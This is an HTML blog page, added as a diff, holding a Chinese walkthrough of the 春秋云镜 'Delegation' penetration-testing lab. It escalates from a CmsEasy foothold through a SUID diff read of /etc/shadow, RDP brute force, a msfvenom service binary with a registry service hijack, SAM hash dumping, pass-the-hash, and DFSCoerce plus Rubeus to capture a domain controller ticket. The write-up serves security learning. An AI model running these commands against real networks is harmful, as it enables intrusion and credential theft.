@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="Rufeii" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      春秋云镜Delegation 
+      
+      
+      |
+    
+     Rufeii
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/me.jpg">
+    <link rel="icon" href="/images/me.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/me.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Rufeii</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/search/">
+          <a href="/search/">Search</a>
+        </li>
+      
+        <li class="nav-item" data-path="/links/">
+          <a href="/links/">Links</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">春秋云镜Delegation</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2026-06-18 01:53:36
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="入口机"><a href="#入口机" class="headerlink" title="入口机"></a>入口机</h1><p>cmseasy，上网找文章</p>
+<p><a target="_blank" rel="noopener" href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E5%AE%89%E8%A3%85%E5%8C%85%E4%B8%8B%E8%BD%BD">CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞 | jdr</a></p>
+<p>写入shell，使用webshell连接工具连接，尝试提权</p>
+<p>可以使用具有suid权限的diff去以root权限读取文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">/tmp &gt;diff /dev/null /etc/shadow</span><br><span class="line"></span><br><span class="line">0a1,32</span><br><span class="line">&gt; root:*:19136:0:99999:7:::</span><br><span class="line">&gt; daemon:*:18375:0:99999:7:::</span><br><span class="line">&gt; bin:*:18375:0:99999:7:::</span><br><span class="line">&gt; sys:*:18375:0:99999:7:::</span><br><span class="line">&gt; <span class="built_in">sync</span>:*:18375:0:99999:7:::</span><br><span class="line">&gt; games:*:18375:0:99999:7:::</span><br><span class="line">&gt; man:*:18375:0:99999:7:::</span><br><span class="line">&gt; lp:*:18375:0:99999:7:::</span><br><span class="line">&gt; mail:*:18375:0:99999:7:::</span><br><span class="line">&gt; news:*:18375:0:99999:7:::</span><br><span class="line">&gt; uucp:*:18375:0:99999:7:::</span><br><span class="line">&gt; proxy:*:18375:0:99999:7:::</span><br><span class="line">&gt; www-data:*:18375:0:99999:7:::</span><br><span class="line">&gt; backup:*:18375:0:99999:7:::</span><br><span class="line">&gt; list:*:18375:0:99999:7:::</span><br><span class="line">&gt; irc:*:18375:0:99999:7:::</span><br><span class="line">&gt; gnats:*:18375:0:99999:7:::</span><br><span class="line">&gt; nobody:*:18375:0:99999:7:::</span><br><span class="line">&gt; systemd-network:*:18375:0:99999:7:::</span><br><span class="line">&gt; systemd-resolve:*:18375:0:99999:7:::</span><br><span class="line">&gt; systemd-timesync:*:18375:0:99999:7:::</span><br><span class="line">&gt; messagebus:*:18375:0:99999:7:::</span><br><span class="line">&gt; syslog:*:18375:0:99999:7:::</span><br><span class="line">&gt; _apt:*:18375:0:99999:7:::</span><br><span class="line">&gt; uuidd:*:19136:0:99999:7:::</span><br><span class="line">&gt; tcpdump:*:19136:0:99999:7:::</span><br><span class="line">&gt; ntp:*:19136:0:99999:7:::</span><br><span class="line">&gt; sshd:*:19136:0:99999:7:::</span><br><span class="line">&gt; systemd-coredump:!!:19136::::::</span><br><span class="line">&gt; _chrony:*:19136:0:99999:7:::</span><br><span class="line">&gt; mysql:!:19165:0:99999:7:::</span><br><span class="line">&gt; ftp:*:19166:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<p>root 的密码哈希是 *，这意味着：</p>
+<ul>
+<li>没有任何密码能匹配这个哈希</li>
+<li>su root 输入任何密码都会失败</li>
+<li>root 的密码登录功能被完全禁用了</li>
+</ul>
+<p>然后貌似这台机器上没有ssh私钥，好的非常好！拿不到rootshell，没关系！</p>
+<h1 id="建立中转枢纽，进攻内网"><a href="#建立中转枢纽，进攻内网" class="headerlink" title="建立中转枢纽，进攻内网"></a>建立中转枢纽，进攻内网</h1><p>直接suo5代理走起</p>
+<p><img src="/../images/achieve/2026/6/image-20260617210556543.png" alt="image-20260617210556543"></p>
+<p>与此同时入口机的fscan也拿到了结果：</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">172.22.4.7:135 open</span><br><span class="line">172.22.4.19:139 open</span><br><span class="line">172.22.4.45:135 open</span><br><span class="line">172.22.4.19:135 open</span><br><span class="line">172.22.4.45:80 open</span><br><span class="line">172.22.4.36:80 open</span><br><span class="line">172.22.4.36:22 open</span><br><span class="line">172.22.4.36:21 open</span><br><span class="line">172.22.4.45:139 open</span><br><span class="line">172.22.4.7:88 open</span><br><span class="line">172.22.4.36:3306 open</span><br><span class="line">172.22.4.7:445 open</span><br><span class="line">172.22.4.45:445 open</span><br><span class="line">172.22.4.19:445 open</span><br><span class="line">172.22.4.7:139 open</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.7</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.4.7</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.19</span><br><span class="line">   [-&gt;]FILESERVER</span><br><span class="line">   [-&gt;]172.22.4.19</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.4.45</span><br><span class="line">   [-&gt;]WIN19</span><br><span class="line">   [-&gt;]172.22.4.45</span><br><span class="line">[*] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393</span><br><span class="line">[*] NetBios 172.22.4.45     XIAORANG<span class="keyword">\WIN</span>19                </span><br><span class="line">[*] OsInfo 172.22.4.7	(Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.4.45        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] WebTitle http://172.22.4.36        code:200 len:68100  title:中文网页标题</span><br></pre></td></tr></table></figure>
+
+<p>稍微整理一番：</p>
+<table>
+<thead>
+<tr>
+<th>IP</th>
+<th>主机名</th>
+<th>角色</th>
+<th>操作系统</th>
+<th>关键端口</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>172.22.4.7</td>
+<td>DC01</td>
+<td>域控 (DC)</td>
+<td>Windows Server 2016 Datacenter</td>
+<td>88 (Kerberos), 135, 139, 445 (SMB)</td>
+</tr>
+<tr>
+<td>172.22.4.19</td>
+<td>FILESERVER</td>
+<td>文件服务器</td>
+<td>Windows Server 2016 Standard</td>
+<td>135, 139, 445 (SMB)</td>
+</tr>
+<tr>
+<td>172.22.4.45</td>
+<td>WIN19</td>
+<td>域成员机</td>
+<td>Windows Server 2016</td>
+<td>80 (IIS), 135, 139, 445 (SMB)</td>
+</tr>
+<tr>
+<td>172.22.4.36</td>
+<td>入口机已拿下</td>
+<td>入口机</td>
+<td>Linux</td>
+<td>21 (FTP), 22 (SSH), 80 (HTTP), 3306 (MySQL)</td>
+</tr>
+</tbody></table>
+<p>本来不想拿flag的奈何提示在flag文件里面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">diff /dev/null /home/flag/flag01.txt</span><br><span class="line"></span><br><span class="line">0a1,15</span><br><span class="line">&gt;   ____  U _____ u  _     U _____ u   ____      _       _____             U  ___ u  _   _     </span><br><span class="line">&gt;  |  _<span class="string">&quot;\ \| ___&quot;</span>|/ |<span class="string">&quot;|    \| ___&quot;</span>|/U /<span class="string">&quot;___|uU  /&quot;</span>\  u  |_ <span class="string">&quot; _|     ___     \/&quot;</span>_ \/ | \ |<span class="string">&quot;|    </span></span><br><span class="line"><span class="string">&gt; /| | | | |  _|&quot;</span> U | | u   |  _|<span class="string">&quot;  \| |  _ / \/ _ \/     | |      |_&quot;</span>_|    | | | |&lt;|  \| |&gt;   </span><br><span class="line">&gt; U| |_| |\| |___  \| |/__  | |___   | |_| |  / ___ \    /| |\      | | .-,_| |_| |U| |\  |u   </span><br><span class="line">&gt;  |____/ u|_____|  |_____| |_____|   \____| /_/   \_\  u |_|U    U/| |\u\_)-\___/  |_| \_|    </span><br><span class="line">&gt;   |||_   &lt;&lt;   &gt;&gt;  //  \\  &lt;&lt;   &gt;&gt;   _)(|_   \\    &gt;&gt;  _// \\_.-,_|___|_,-.  \\    ||   \\,-. </span><br><span class="line">&gt;  (__)_) (__) (__)(_<span class="string">&quot;)(&quot;</span>_)(__) (__) (__)__) (__)  (__)(__) (__)\_)-<span class="string">&#x27; &#x27;</span>-(_/  (__)   (_<span class="string">&quot;)  (_/  </span></span><br><span class="line"><span class="string">&gt; </span></span><br><span class="line"><span class="string">&gt; flag01: flag&#123;dfaf3b19-dfe6-4fb5-85ce-71222a7b535d&#125;</span></span><br><span class="line"><span class="string">&gt; </span></span><br><span class="line"><span class="string">&gt; Great job!!!!!!</span></span><br><span class="line"><span class="string">&gt; </span></span><br><span class="line"><span class="string">&gt; Here is the hint: WIN19\Adrian</span></span><br><span class="line"><span class="string">&gt; </span></span><br><span class="line"><span class="string">&gt; I&#x27;ll do whatever I can to rock you...</span></span><br></pre></td></tr></table></figure>
+
+<p>实战的话是要先从入口机里面提取拿敏感文件制作密码本的，这里就把flag文件当中敏感文件吧！</p>
+<p>实战思路：先在入口机信息搜集制作密码本后去打内网的web服务，数据库，ftp啥的！</p>
+<p>根据提示，这里有了用户名，那么第一步自然优先攻击WIN19！</p>
+<h1 id="172-22-4-45"><a href="#172-22-4-45" class="headerlink" title="172.22.4.45"></a>172.22.4.45</h1><p>fscan扫一下端口，发现有3389尝试爆破rdp</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q hydra -l <span class="string">&quot;Adrian&quot;</span> -P /usr/share/wordlists/rockyou.txt rdp://172.22.4.45 -vV -f</span><br><span class="line"></span><br><span class="line">[RE-ATTEMPT] target 172.22.4.45 - login <span class="string">&quot;Adrian&quot;</span> - pass <span class="string">&quot;babygirl1&quot;</span> - 225 of 14344401 [child 0] (0/2)</span><br><span class="line">[ERROR] freerdp: The connection failed to establish.</span><br><span class="line">[ERROR] freerdp: The password has expired and must be changed. (0x0002000e)</span><br><span class="line">[VERBOSE] Disabled child 2 because of too many errors</span><br><span class="line">[ERROR] all children were disabled due too many connection errors</span><br><span class="line">0 of 1 target completed, 0 valid password found</span><br><span class="line">[INFO] Writing restore file because 2 server scans could not be completed</span><br><span class="line">[ERROR] 1 target was disabled because of too many errors</span><br><span class="line">[ERROR] 1 targets did not complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-17 21:59:00</span><br></pre></td></tr></table></figure>
+
+<p>密码 babygirl1 是正确的，但已过期需要修改，实际情况一个密码经常会被拿来复用这一点用注意！</p>
+<p><img src="/../images/achieve/2026/6/image-20260617220913175.png" alt="image-20260617220913175"></p>
+<p>kali的rdesktop可以改。于是尝试提取，那么首先就是对此台机器信息手机，很明显桌面有个：PrivescCheck 文件夹，是一个非常经典的 Windows 权限提升检查工具（Privilege Escalation Checker）。</p>
+<p>看看检测报告：</p>
+<p><img src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20240716-091617-04327f0194a11e0c332b629346fed179.png" alt="img"></p>
+<p>当前用户（WIN19\Adrian）对注册表里 gupdate 服务的配置项拥有写入权限，而这个服务是以 LocalSystem 权限运行的。尝试注册表提权（注册表提权命令部分摘录自<a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/09/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7delegation/">春秋云境·Delegation – fushulingのblog</a>）：</p>
+<p>首先用msfvenom生成执行马</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec cmd=<span class="string">&#x27;C:\windows\system32\cmd.exe /c C:\users\Adrian\Desktop\sam.bat &#x27;</span> --platform windows -f exe-service &gt; a.exe</span><br></pre></td></tr></table></figure>
+
+<p>然后写一个sam.bat，内容如下然后传到win机器上：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\Users\Adrian\Desktop\system</span><br><span class="line">reg save hklm\sam C:\Users\Adrian\Desktop\sam</span><br><span class="line">reg save hklm\security C:\Users\Adrian\Desktop\security</span><br></pre></td></tr></table></figure>
+
+<p>rdesktop没开共享剪切板重定向，直接用Windows的远程桌面连接可以直接复制粘贴！</p>
+<p>首先修改注册表服务</p>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM<span class="keyword">\SYSTEM</span><span class="keyword">\CurrentControlSet</span><span class="keyword">\Services</span><span class="keyword">\gupdate</span>&quot; /t REG<span class="built_in">_</span>EXPAND<span class="built_in">_</span>SZ /v ImagePath /d &quot;C:<span class="keyword">\Users</span><span class="keyword">\Adrian</span><span class="keyword">\Desktop</span><span class="keyword">\a</span>.exe&quot; /f</span><br></pre></td></tr></table></figure>
+
+<p>接着在cmd启动服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start gupdate</span><br></pre></td></tr></table></figure>
+
+<p>桌面会出现三个文件，我们传到kali用secretsdump解一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py LOCAL -system system -sam sam -security security</span><br></pre></td></tr></table></figure>
+
+<p>拿到三个东西重点看以下两个：</p>
+<p><strong>Administrator 哈希</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::</span><br></pre></td></tr></table></figure>
+
+<p>这是本地内置的 Administrator 账户哈希（RID 500）。虽然很多时候这个账户被禁用，但哈希可以留着以后用。</p>
+<p><strong>Machine Account Secret（机器账户密码）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:21b11500d5834a2b9b3373564a0565f6</span><br></pre></td></tr></table></figure>
+
+<p>这是这台机器在域里的机器账户密码（十六进制）。在域渗透里，这个有时候能用来做 <strong>DCSync</strong> 或其他域信任攻击。</p>
+<p>本地Administrator哈希传递</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab Administrator@172.22.4.45 -codec gbk</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/achieve/2026/6/image-20260617231734896.png" alt="image-20260617231734896"></p>
+<h1 id="172-22-4-45跳板域内信息收集"><a href="#172-22-4-45跳板域内信息收集" class="headerlink" title="172.22.4.45跳板域内信息收集"></a>172.22.4.45跳板域内信息收集</h1><p>使用<a target="_blank" rel="noopener" href="https://github.com/lzzbb/Adinfo">lzzbb&#x2F;Adinfo: 域信息收集工具</a>去收集域内信息，要使用机器用户的hash，但是不知道为什么上面那个用不了，用猕猴桃再抓一下吧！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Adrian\Desktop&gt; .\Adinfo_win.exe -d xiaorang.lab --dc 172.22.4.7 -u WIN19$ -H 84015e534cf684fc319bcb57fe1a595c</span><br><span class="line"></span><br><span class="line">           _____  _        __</span><br><span class="line">     /\   |  __ \(_)      / _|</span><br><span class="line">    /  \  | |  | |_ _ __ | |_ ___</span><br><span class="line">   / /\ \ | |  | | | <span class="string">&#x27;_ \|  _/ _ \     Tools that collect information from domain</span></span><br><span class="line"><span class="string">  / ____ \| |__| | | | | | || (_) |</span></span><br><span class="line"><span class="string"> /_/    \_\_____/|_|_| |_|_| \___/     v1.5 by lzz</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] Try to connect &#x27;</span>172.22.4.7<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[c] Auth Domain: xiaorang.lab</span></span><br><span class="line"><span class="string">[c] Auth user: WIN19$</span></span><br><span class="line"><span class="string">[c] Auth hash: 22efd36d08f27afdf0628d9ba2bff827</span></span><br><span class="line"><span class="string">[c] connected successfully,try to dump domain info</span></span><br><span class="line"><span class="string">[i] DomainVersion found!</span></span><br><span class="line"><span class="string">                    [+] Windows 2016 Server operating system</span></span><br><span class="line"><span class="string">[i] Domain SID:</span></span><br><span class="line"><span class="string">                    [+] S-1-5-21-1913786442-1328635469-1954894845</span></span><br><span class="line"><span class="string">[i] Domain MAQ found</span></span><br><span class="line"><span class="string">                    [+] 10</span></span><br><span class="line"><span class="string">[i] Domain Account Policy found</span></span><br><span class="line"><span class="string">                    [+] pwdHistory: 24</span></span><br><span class="line"><span class="string">                    [+] minPwdLength: 7</span></span><br><span class="line"><span class="string">                    [+] minPwdAge: 1(day)</span></span><br><span class="line"><span class="string">                    [+] maxPwdAge: 42(day)</span></span><br><span class="line"><span class="string">                    [+] lockoutThreshold: 0</span></span><br><span class="line"><span class="string">                    [+] lockoutDuration: 30(min)</span></span><br><span class="line"><span class="string">[i] Domain Controllers: 1 found</span></span><br><span class="line"><span class="string">                    [+] DC01$  ==&gt;&gt;&gt;   Windows Server 2016 Datacenter  [10.0 (14393)]  ==&gt;&gt;&gt;  172.22.4.7</span></span><br><span class="line"><span class="string">[i] ADCS has not found!</span></span><br><span class="line"><span class="string">[i] Domain Exchange Server: 0 found</span></span><br><span class="line"><span class="string">[i] Domain All DNS:</span></span><br><span class="line"><span class="string">                    [+] Domain Dns 3 found,Saved in All_DNS.csv</span></span><br><span class="line"><span class="string">[i] Domain Trusts: 0 found</span></span><br><span class="line"><span class="string">[i] SPN: 39 found</span></span><br><span class="line"><span class="string">[i] Domain GPOs: 2 found</span></span><br><span class="line"><span class="string">[i] Domain Admins: 1 users found</span></span><br><span class="line"><span class="string">                    [+]Administrator</span></span><br><span class="line"><span class="string">[i] Enterprise Admins: 1 users found</span></span><br><span class="line"><span class="string">                    [+]Administrator</span></span><br><span class="line"><span class="string">[i] administrators: 1 users found</span></span><br><span class="line"><span class="string">                    [+]Administrator</span></span><br><span class="line"><span class="string">[i] Backup Operators: 0 users found</span></span><br><span class="line"><span class="string">[i] Users: 6 found</span></span><br><span class="line"><span class="string">[i] User with Mail: 0 found</span></span><br><span class="line"><span class="string">[i] Only_name_and_Useful_Users: 3 found</span></span><br><span class="line"><span class="string">[i] Only_admincount=1_andUseful_Users: 1 found</span></span><br><span class="line"><span class="string">[i] Locked Users: 0 found</span></span><br><span class="line"><span class="string">[i] Disabled Users: 3 found</span></span><br><span class="line"><span class="string">[i] Users with passwords not set to expire: 2 found</span></span><br><span class="line"><span class="string">[i] Domain Computers: 5 found</span></span><br><span class="line"><span class="string">[i] Only_name_and_Useful_computers: 5 found</span></span><br><span class="line"><span class="string">[i] Groups: 49 found</span></span><br><span class="line"><span class="string">[i] Domain OUs: 1 found</span></span><br><span class="line"><span class="string">[i] LAPS Not found</span></span><br><span class="line"><span class="string">[i] LAPS passwords: 0 found</span></span><br><span class="line"><span class="string">[i] SensitiveDelegate Users: 0 found</span></span><br><span class="line"><span class="string">[i] AsReproast Users: 0 found</span></span><br><span class="line"><span class="string">[i] Kerberoast Users: 1 found</span></span><br><span class="line"><span class="string">                    [+] CN=krbtgt,CN=Users,DC=xiaorang,DC=lab  ==&gt;&gt;&gt;  kadmin/changepw</span></span><br><span class="line"><span class="string">[i] SIDHistory Users: 0 found</span></span><br><span class="line"><span class="string">[i] CreatorSID Users: 2 found</span></span><br><span class="line"><span class="string">                    [+] WIN-3X7U15C2XDM$  ==&gt;&gt;&gt;  Marcus</span></span><br><span class="line"><span class="string">                    [+] WIN-YUUAW2QG9MF$  ==&gt;&gt;&gt;  Marcus</span></span><br><span class="line"><span class="string">[i] RBCD Users: 0 found</span></span><br><span class="line"><span class="string">[i] Unconstrained Deligation Users: 1 found</span></span><br><span class="line"><span class="string">                    [+] WIN19$</span></span><br><span class="line"><span class="string">[i] Constrained Deligation Users: 0 found</span></span><br><span class="line"><span class="string">[i] Krbtgt password last set time: 2022-06-22 22:54:34 +0800 CST</span></span><br><span class="line"><span class="string">[i] CSVs written to &#x27;</span>csv<span class="string">&#x27; directory in C:\Users\Adrian\Desktop</span></span><br><span class="line"><span class="string">[i] Execution took 1.0226163s</span></span><br></pre></td></tr></table></figure>
+
+<p>最关键的问题：WIN19$ 的非约束委派（Unconstrained Delegation）</p>
+<blockquote>
+<p>简单说就是：当 WIN19$ 这台机器收到其他用户的认证请求时，它可以<strong>把用户的 TGT（票据）完整地转发</strong>给它想转发的任何服务。</p>
+<p>攻击者如果能控制 WIN19$（比如你已经拿到了它的 Hash），就可以通过一些技术（Printer Bug、PetitPotam 等）让域内高权限用户向这台机器认证，从而拿到高权限用户的 TGT，进而进行<strong>票据传递攻击</strong>，最终可能拿下域控。</p>
+</blockquote>
+<p>所以问题的关键在于如何让DC来委派WIN19$，答案是：CoerceToTGT</p>
+<blockquote>
+<p>CoerceToTGT<br>它完美地结合了 强制认证（Coercion） 和 非约束性委派（Unconstrained Delegation）。<br>CoerceToTGT 是“强制认证攻击”在“非约束性委派”环境下的终极应用。</p>
+<p>强制认证（手段&#x2F;推手）：利用打印机漏洞（MS-RPRN）或文件系统漏洞（PetitPotam），强迫域控（DC）主动访问你控制的那台机器。<br>强制认证是指：利用 Windows 某些协议在设计上的缺陷或特性，远程命令目标机器（如 DC）：“嘿，我现在要求你立刻通过 SMB 或 HTTP 协议连接到我的这台机器（那个开了委派的坑）进行身份验证。”</p>
+</blockquote>
+<h1 id="172-22-4-45CoerceToTGT域控"><a href="#172-22-4-45CoerceToTGT域控" class="headerlink" title="172.22.4.45CoerceToTGT域控"></a>172.22.4.45CoerceToTGT域控</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$</span><br><span class="line"></span><br><span class="line">proxychains4 python3 dfscoerce.py -u <span class="string">&quot;WIN19$&quot;</span> -hashes :84015e534cf684fc319bcb57fe1a595c -d xiaorang.lab win19 172.22.4.7</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/achieve/2026/6/image-20260618011913071.png" alt="image-20260618011913071"></p>
+<p>成功监听到TGT，现在有了域控的TGT下一步自然就是去DCSycn攻击，用猕猴桃注入票据</p>
